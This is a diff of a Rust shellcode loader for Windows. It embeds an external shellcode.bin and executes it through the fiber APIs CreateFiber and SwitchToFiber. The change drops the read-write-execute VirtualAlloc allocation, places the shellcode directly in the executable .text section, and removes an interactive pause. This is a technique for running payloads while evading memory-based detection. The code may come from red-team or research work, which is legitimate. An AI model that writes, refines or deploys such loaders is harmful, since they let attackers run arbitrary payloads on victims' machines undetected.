@@ -1,47 +1,31 @@
 #![allow(deprecated)]
 
-use std::{intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};
+use std::{mem::transmute, ptr::null};
 
-use windows_sys::Win32::System::{
-    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
-    Threading::{ConvertFiberToThread, CreateFiber, DeleteFiber, SwitchToFiber},
+use windows_sys::Win32::System::Threading::{
+    ConvertFiberToThread, ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
 };
 
 const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
 const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();
 
-fn pause() {
-    println!("[*] Press Enter to continue...");
-    let mut input = String::new();
-    std::io::stdin().read_line(&mut input).unwrap();
-}
+#[unsafe(no_mangle)]
+#[unsafe(link_section = ".text")]
+static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");
+
+// fn pause() {
+//     println!("[*] Press Enter to continue...");
+//     let mut input = String::new();
+//     std::io::stdin().read_line(&mut input).unwrap();
+// }
 
 fn main() {
+    let shellcode_ptr = SHELLCODE.as_ptr() as *mut u8;
+
     unsafe {
-        let shellcode_ptr = VirtualAlloc(
-            null_mut(),
-            SHELLCODE_SIZE,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        );
+        let main_thread = ConvertThreadToFiber(null());
 
-        if shellcode_ptr.is_null() {
-            println!("[!] Failed to allocate memory for shellcode");
-            return;
-        }
-
-        println!(
-            "[+] Allocated {} bytes at {:p} for shellcode",
-            SHELLCODE_SIZE, shellcode_ptr
-        );
-
-        copy_nonoverlapping(
-            SHELLCODE_BYTES.as_ptr(),
-            shellcode_ptr as *mut u8,
-            SHELLCODE_SIZE,
-        );
-
-        let main_thread = ConvertFiberToThread();
+        println!("[+] Converted main thread to fiber: {:?}", main_thread);
 
         let fiber = CreateFiber(0, transmute(shellcode_ptr), std::ptr::null_mut());
 
@@ -49,8 +33,6 @@ fn main() {
             println!("[!] Failed to create fiber");
             return;
         }
-
-        pause();
 
         SwitchToFiber(fiber);
 
